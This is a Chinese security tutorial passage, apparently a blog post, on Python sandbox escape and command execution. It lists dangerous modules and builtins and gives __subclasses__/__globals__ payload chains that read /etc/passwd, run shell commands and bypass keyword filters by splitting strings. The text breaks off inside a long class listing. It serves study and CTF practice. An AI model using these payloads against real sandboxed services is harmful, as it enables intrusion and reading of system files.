        <content type="html"><![CDATA[<p><font color=red>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</font></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="标准库危险模块"><a href="#标准库危险模块" class="headerlink" title="标准库危险模块"></a>标准库危险模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理标记的都是通用的</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands  <span class="comment"># 仅限于python2</span></span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接输入shell命令,以ifconfig举例</span></span><br><span class="line">os.system(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;ifconfig&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line">platform.popen(<span class="string">&#x27;dir&#x27;</span>).read() <span class="comment"># 仅限于python2</span></span><br><span class="line">subprocess.call([<span class="string">&#x27;ifconfig&#x27;</span>],shell=<span class="literal">True</span>)</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br><span class="line">sys.call_tracing(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br></pre></td></tr></table></figure><h4 id="内置危险函数"><a href="#内置危险函数" class="headerlink" title="内置危险函数"></a>内置危险函数</h4><p>在python中,我们知道,不用引入直接使用的内置函数称为 builtin 函数，execfile可以执行任意文本中的python函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 处理标记的都是通用的</span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os;os.system(&#x27;ifconfig&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>);  <span class="comment"># 过滤空格</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>);system(<span class="string">&#x27;ls&#x27;</span>)  <span class="comment"># 仅限于python2</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> os;<span class="built_in">map</span>(os.system,[<span class="string">&#x27;ifconfig&#x27;</span>])</span><br></pre></td></tr></table></figure><h4 id="globals-模块"><a href="#globals-模块" class="headerlink" title="__globals__模块"></a>__globals__模块</h4><p>该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用__globals__属性访问全局的变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="keyword">lambda</span> x:x+<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(a)</span><br><span class="line">[<span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>, <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;func_closure&#x27;</span>, <span class="string">&#x27;func_code&#x27;</span>, <span class="string">&#x27;func_defaults&#x27;</span>, <span class="string">&#x27;func_dict&#x27;</span>, <span class="string">&#x27;func_doc&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;func_name&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__globals__</span><br><span class="line">&#123;<span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;a&#x27;</span>: &lt;function &lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x7ff89545a350</span>&gt;, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.func_globals</span><br><span class="line">&#123;<span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;a&#x27;</span>: &lt;function &lt;<span class="keyword">lambda</span>&gt; at <span class="number">0x7ff89545a350</span>&gt;, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ifconfig&#x27;)&quot;</span>)</span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">10.18</span><span class="number">.69</span><span class="number">.174</span>  netmask <span class="number">255.255</span><span class="number">.248</span><span class="number">.0</span>  broadcast <span class="number">10.18</span><span class="number">.71</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::20c:29ff:fe7d:da26  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:0c:<span class="number">29</span>:7d:da:<span class="number">26</span>  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">16332</span>  <span class="built_in">bytes</span> <span class="number">8119588</span> (<span class="number">7.7</span> MiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">1538</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">5406</span>  <span class="built_in">bytes</span> <span class="number">498612</span> (<span class="number">486.9</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0x10</span>&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">187</span>  <span class="built_in">bytes</span> <span class="number">17050</span> (<span class="number">16.6</span> KiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">187</span>  <span class="built_in">bytes</span> <span class="number">17050</span> (<span class="number">16.6</span> KiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure><p>func_globals和 <strong>globals</strong> 作用是一样的，如果过滤了__builtin__中的内容，这样 <strong>globals</strong> 里面的__builtins__也就没有什么意义了，即使重新import <strong>builtin</strong> 还是一样.</p><h4 id="Magic-Method（魔术方法）"><a href="#Magic-Method（魔术方法）" class="headerlink" title="Magic Method（魔术方法）"></a>Magic Method（魔术方法）</h4><p>直接输出结论，基于Python2。如果是Python3那么__subclasses__()[xx]中的xx值需要自己找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>].__dict__[<span class="string">&#x27;sy&#x27;</span>+<span class="string">&#x27;stem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 等效于下面语句，但是无法绕过</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure><p>尝试利用继承关系来找到object类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>前面不仅可以使用双引号，还可以利用列表或者字典类型，区别在查找类型的时候在不同的基础上查找，返回都是元组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__bases__</span><br><span class="line">&#123;&#125;.__class__.__bases__</span><br></pre></td></tr></table></figure><p>查看可以使用的模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversekeyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reversevalueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_reverseitemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;odict_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;managedbuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;stderrprinter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;mappingproxy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method-wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.SimpleNamespace&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;longrange_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;callable_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;pickle.PickleBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;coroutine_wrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;InterpreterID&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;BaseException&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_array_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_bitmap_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;hamt_collision_node&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;keys&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;items&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Context&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;ContextVar&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;Token.MISSING&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;moduledef&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;filter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;map&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zip&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._DummyModuleLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ModuleLockManager&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.ModuleSpec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.FrozenImporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib._ImportLockContext&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread._local&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.lock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_thread.RLock&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._IOBase&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io._BytesIOBuffer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_io.IncrementalNewlineDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.ScandirIterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.DirEntry&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._LoaderBasics&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespacePath&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external._NamespaceLoader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.PathFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib_external.FileFinder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;zipimport._ZipImportResourceReader&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.Codec&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamReaderWriter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.StreamRecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abc._abc_data&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;abc.ABC&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_itemiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Hashable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Awaitable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.GenericAlias&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.AsyncIterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytes_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_keyiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;dict_valueiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;list_reverseiterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;range_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;set_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;str_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;tuple_iterator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Callable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_sitebuiltins._Helper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types.DynamicClassAttribute&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;types._GeneratorWrapper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.accumulate&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.filterfalse&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.zip_longest&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;itertools._tee&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span 